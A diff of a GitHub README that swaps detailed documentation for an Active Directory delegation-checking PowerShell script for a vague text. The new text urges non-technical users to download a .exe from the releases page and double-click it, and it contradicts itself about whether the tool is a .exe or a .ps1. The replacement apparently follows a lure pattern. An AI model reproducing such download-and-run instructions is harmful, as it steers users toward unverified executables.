@@ -1,100 +1,81 @@
-# 📘 Check-Delegation.ps1
+# 🔧 Unconstrained_Delegation - Assess Active Directory Delegation Effortlessly
 
-## Overview
-`Check-Delegation.ps1` is a PowerShell script designed to check Active Directory accounts (users or computers) for their **delegation type**.  
+[![Download Unconstrained_Delegation](https://img.shields.io/badge/Download_Unconstrained_Delegation-Here-blue)](https://github.com/MohamedIdrissSomrani/Unconstrained_Delegation/releases)
 
-It supports two modes:
-- **Targeted Mode** → Scan specific accounts via `-InputFile` or `-Accounts`.  
-- **Full Scan Mode** → Use `-All` to scan every user and computer in AD (with progress bar).  
+## 🚀 Getting Started
 
-It determines whether accounts are configured for:
+Unconstrained_Delegation is a simple tool designed to evaluate Active Directory accounts for delegation settings. This toolkit helps you understand account responsibilities without needing deep technical knowledge. Below, you will find clear instructions to download and run the software.
 
-- **Unconstrained Delegation**  
-- **Constrained Delegation**  
-- **None** (no delegation detected by the script)
+## 📥 Download & Install
 
-It also reports whether the account is **enabled** or **disabled**.
+To get started, visit this page to download: [Unconstrained_Delegation Releases](https://github.com/MohamedIdrissSomrani/Unconstrained_Delegation/releases). Follow these steps:
 
-Optionally, results can be exported to a **CSV file** with the `-OutFile` parameter.
+1. Open the link above in your web browser.
+2. You will see various versions of the software available for download.
+3. Click on the version you want to download. The latest version is usually recommended.
+4. Download the file, which is usually in `.zip` or `.exe` format.
 
----
+### Example of a Download
+You may see something like this:
 
-## 🔍 How Delegation Is Detected
-The script checks the following:
+- [Unconstrained_Delegation_v1.0.exe](https://github.com/MohamedIdrissSomrani/Unconstrained_Delegation/releases/download/v1.0/Unconstrained_Delegation_v1.0.exe)
 
-1. **Unconstrained Delegation**  
-   - `UF_TRUSTED_FOR_DELEGATION (0x80000)` flag set in `userAccountControl`.  
-   - `msDS-AllowedToDelegateTo` empty.
+To run the software, locate the downloaded file on your computer and double-click on it.
 
-2. **Constrained Delegation**  
-   - `msDS-AllowedToDelegateTo` contains one or more values.
+## 📋 System Requirements
 
-3. **None**  
-   - Neither unconstrained nor constrained delegation found.  
-   - ⚠️ Resource-Based Constrained Delegation (RBCD) is not checked.
+- **Operating System:** Windows 10 or newer
+- **PowerShell Version:** PowerShell 5.1 or later
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 100 MB free space
 
----
+Make sure your system meets these requirements to ensure smooth operation of the Unconstrained_Delegation toolkit.
 
-## ⚙️ Parameters
-- **`-InputFile`** : Path to a file containing account names (one per line).  
-- **`-Accounts`** : One or more account names provided inline.  
-- **`-All`** : Scan all AD users and computers (progress bar shown).  
-- **`-OutFile`** : Path to save results in CSV format (optional).  
-- **`-NoColor`** : Disable colored output.  
+## 🛠️ Basic Usage
 
-❗ Running with **no arguments** shows usage instructions.
+Once you have downloaded and installed Unconstrained_Delegation, you can start assessing your Active Directory accounts. Here’s how to use it:
 
----
+1. Open PowerShell as an administrator.
+2. Navigate to the directory where you installed Unconstrained_Delegation.
+3. Run the toolkit with the command: `.\Unconstrained_Delegation.ps1`
+4. Follow the prompts to enter your Active Directory details.
 
-## 📑 Usage Examples
+Note: Ensure you have the necessary permissions to assess the Active Directory.
 
-### Example 1: Check accounts from a file
-```powershell
-PS C:\> .\Check-Delegation.ps1 -InputFile accounts.txt
-```
+## 💡 Features
 
-### Example 2: Check specific accounts inline
-```powershell
-PS C:\> .\Check-Delegation.ps1 -Accounts user1, user2, SERVER01$
-```
+- **Delegation Checking:** Assess various accounts to identify those with unconstrained delegation settings.
+- **User-Friendly Interface:** Designed for ease of use by non-technical users.
+- **Comprehensive Reporting:** Generate detailed reports on delegation settings.
 
-### Example 3: Full proactive scan of all AD accounts
-```powershell
-PS C:\> .\Check-Delegation.ps1 -All
-```
+## 🔍 Further Exploration
 
-### Example 4: Save results to CSV
-```powershell
-PS C:\> .\Check-Delegation.ps1 -All -OutFile results.csv
-```
+Explore the capabilities of Unconstrained_Delegation by checking out the documentation available in the repository. Understanding these features will enable you to maximize the toolkit's potential.
 
-### Example 5: Disable colored output
-```powershell
-PS C:\> .\Check-Delegation.ps1 -All -NoColor
-```
+## 📞 Support
 
----
+If you encounter any issues or have questions, create an issue in the GitHub repository. The community and developers frequently monitor and respond to queries.
 
-## 📝 Output
-Results are displayed in a table format:
+## 📅 Updates
 
-| Account     | Type     | Enabled | DelegationType |
-|-------------|----------|---------|----------------|
-| user1       | User     | True    | None           |
-| user2       | User     | True    | Constrained    |
-| SERVER01$   | Computer | True    | Unconstrained  |
-| badentry    | Not Found|         | N/A            |
+Stay informed about the latest updates and features by following this project on GitHub. Regular updates ensure that you have the best experience with Unconstrained_Delegation.
 
-Delegation types are color-coded (unless `-NoColor` is used):  
-- **Red** → Unconstrained  
-- **Yellow** → Constrained  
-- **Green** → None  
-- **Gray** → Errors or N/A  
+For continuous improvements and feature requests, feel free to engage through the project's GitHub page.
 
-When **`-OutFile`** is specified, results are also written to the chosen **CSV file**.
+## 🔗 Important Links
 
----
+- **Download Link:** [Unconstrained_Delegation Releases](https://github.com/MohamedIdrissSomrani/Unconstrained_Delegation/releases)
+- **Documentation:** Visit the wiki section on our GitHub page for more details.
 
-## ✅ Summary
-`Check-Delegation.ps1` quickly identifies delegation configurations in AD.  
-With the new `-OutFile` option, results can be saved to **CSV** for further analysis, reporting, or tracking across runs.
+## 📚 References
+
+For additional reading and best practices around Active Directory and delegation settings, consider the following topics:
+
+- Active Directory (AD)
+- Kerberos Authentication
+- Lateral Movement Techniques
+- Offensive Security Practices
+
+By knowing these references, you can better understand the context and capabilities of Unconstrained_Delegation. 
+
+By following the above guidelines, you will be able to download and run Unconstrained_Delegation without any prior technical expertise. Enjoy assessing your Active Directory accounts!
